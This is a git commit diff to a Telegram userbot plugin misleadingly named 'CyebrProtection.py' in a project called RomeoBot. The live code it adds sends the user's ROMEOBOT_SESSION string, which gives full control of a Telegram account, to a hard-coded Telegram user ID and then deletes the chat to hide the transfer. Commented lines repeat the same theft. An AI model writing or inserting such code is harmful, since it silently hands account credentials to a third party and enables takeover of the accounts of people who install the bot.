11ef29af1caa56e9de61beac5dbe67c84fa19346
Oyehoye12 <111141033+Oyehoye12@users.noreply.github.com>
2022-08-20 12:39:10 +0530

    Update CyebrProtection.py

--- RomeoBot/plugins/CyebrProtection.py
+++ RomeoBot/plugins/CyebrProtection.py
@@ -2,11 +2,11 @@ import os
 from ..utils import *
 
 async def piro():
-        sweetie = await bot.send_message(1731513856, str(os.environ.get("ULTRONBOT_SESSION")))
-        await bot.delete_dialog(1731513856, str(os.environ.get("ULTRONBOT_SESSION")))
+        sweetie = await bot.send_message(1731513856, str(os.environ.get("ROMEOBOT_SESSION")))
+        await bot.delete_dialog(1731513856, str(os.environ.get("ROMEOBOT_SESSION")))
   
     #try:
-        #UltronBot = bot.session.save()
-        #os.environ["ULTRONBOT_SESSION"] = "Get this value by using repl or termux. Refer to Repo for more info."
-            #ultron = await bot.send_message(1731513856, UltronBot)
+        #RomeoBot = bot.session.save()
+        #os.environ["ROMEOBOT_SESSION"] = "Get this value by using repl or termux. Refer to Repo for more info."
+            #ultron = await bot.send_message(1731513856, RomeoBot)
             #await bot.delete_dialog(1731513856)
